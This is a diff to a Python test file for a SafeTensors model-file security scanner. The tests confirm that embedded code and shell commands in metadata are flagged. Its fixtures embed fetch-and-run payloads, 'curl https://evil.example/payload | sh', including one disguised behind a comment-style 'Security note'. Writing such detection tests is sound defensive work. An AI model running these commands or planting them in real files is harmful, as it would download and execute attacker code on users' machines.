@@ -495,7 +495,13 @@ def test_safetensors_documentation_examples_are_not_code_injection(tmp_path: Pat
 def test_safetensors_documentation_guard_does_not_hide_executable_metadata(tmp_path: Path) -> None:
     file_path = tmp_path / "comment_padded_payload.safetensors"
     data = {"t": np.arange(5, dtype=np.float32)}
-    metadata = {"description": "# Security note\nos.system('curl https://evil.example/payload | sh')"}
+    metadata = {
+        "description": (
+            "# Security note\n"
+            "# The following line must not run during model loading.\n"
+            "os.system('curl https://evil.example/payload | sh')"
+        )
+    }
     save_file(data, str(file_path), metadata=metadata)
 
     result = SafeTensorsScanner().scan(str(file_path))
@@ -504,6 +510,22 @@ def test_safetensors_documentation_guard_does_not_hide_executable_metadata(tmp_p
         check.name == "SafeTensors Code Injection Detection"
         and check.status == CheckStatus.FAILED
         and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_safetensors_documentation_guard_does_not_hide_shell_metadata(tmp_path: Path) -> None:
+    file_path = tmp_path / "shell_payload_metadata.safetensors"
+    data = {"t": np.arange(5, dtype=np.float32)}
+    metadata = {"description": "curl https://evil.example/payload | sh --arg one two"}
+    save_file(data, str(file_path), metadata=metadata)
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert any(
+        check.name == "Metadata Pattern Check"
+        and check.status == CheckStatus.FAILED
+        and check.details["pattern"] == r"https?://"
         for check in result.checks
     )
 
